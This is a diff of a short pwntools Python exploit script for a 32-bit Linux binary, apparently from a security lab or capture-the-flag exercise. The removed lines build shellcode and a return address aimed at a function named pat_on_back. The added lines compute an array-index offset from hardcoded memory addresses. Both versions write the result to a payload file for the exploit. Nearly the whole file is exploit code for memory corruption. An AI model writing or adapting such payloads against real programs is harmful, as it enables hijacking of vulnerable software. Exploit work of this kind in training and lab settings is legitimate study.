@@ -2,17 +2,15 @@ from pwn import *
 context.arch = 'i386'
 context.os = 'linux'
 
-# shellcode
-s_code = shellcraft.i386.push('$p')
-s_code_asm = asm(s_code)
+#ptrs address
+ptrs_addr = 0x56559094
+#p address
+p_addr = 0xffffd08c
 
-# return address
-# r_addr = pat_on_back() addr
-r_addr = 0x56556241 - len(s_code_asm) - 64 - 4
-addr = p32(r_addr, endian='little')
+s_addr = (p_addr - ptrs_addr) // 4
 
-payload = s_code_asm
+payload = s_addr
 
-with open("./shellcode_payload_inj_aglobal" , "wb") as f:
-	f.write(payload)
+with open("./shellcode_payload_inj_aglobal" , "w") as f:
+	f.write(str(payload))
 
